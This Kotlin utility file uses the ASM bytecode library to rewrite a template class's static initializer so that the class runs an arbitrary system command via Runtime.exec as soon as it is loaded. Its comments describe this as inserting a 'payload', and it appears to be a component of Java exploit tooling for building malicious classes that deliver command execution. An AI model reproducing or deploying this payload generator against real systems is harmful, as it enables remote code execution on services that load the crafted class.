package util

import org.objectweb.asm.*
import java.io.InputStream


/**
 * Insert command to template class file
 * @param stream class byte stream
 * @param command system command
 */
fun insertCommand(stream: InputStream?, command: String): ByteArray {
    val cr = ClassReader(stream)
    val cw = ClassWriter(ClassWriter.COMPUTE_FRAMES)
    val cv = ClassTransformer(cw, command)
    cr.accept(cv, 2)
    return cw.toByteArray()
}

class ClassTransformer(
    classVisitor: ClassVisitor,
    val command: String
) : ClassVisitor(Opcodes.ASM7, classVisitor) {

    /**
     * insert payload in "static" block
     */
    override fun visitMethod(
        access: Int,
        name: String?,
        descriptor: String?,
        signature: String?,
        exceptions: Array<out String>?
    ): MethodVisitor {
        val mv = super.visitMethod(access, name, descriptor, signature, exceptions)
        return if (name!! == "<clinit>") {
            MethodTransformer(mv, command)
        } else {
            mv
        }
    }
}

class MethodTransformer(
    methodVisitor: MethodVisitor,
    val command: String
) : MethodVisitor(Opcodes.ASM7, methodVisitor) {
    override fun visitCode() {
        val label0 = Label()
        val label1 = Label()
        val label2 = Label()
        mv.visitTryCatchBlock(label0, label1, label2, "java/lang/Exception")
        mv.visitLabel(label0)
        mv.visitLdcInsn(command)
        mv.visitVarInsn(Opcodes.ASTORE, 0)
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false)
        mv.visitVarInsn(Opcodes.ALOAD, 0)
        mv.visitMethodInsn(
            Opcodes.INVOKEVIRTUAL,
            "java/lang/Runtime",
            "exec",
            "(Ljava/lang/String;)Ljava/lang/Process;",
            false
        )
        mv.visitInsn(Opcodes.POP)
        mv.visitLabel(label1)
        val label3 = Label()
        mv.visitJumpInsn(Opcodes.GOTO, label3)
        mv.visitLabel(label2)
        mv.visitVarInsn(Opcodes.ASTORE, 0)
        mv.visitVarInsn(Opcodes.ALOAD, 0)
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Exception", "printStackTrace", "()V", false)
        mv.visitLabel(label3)
    }
}
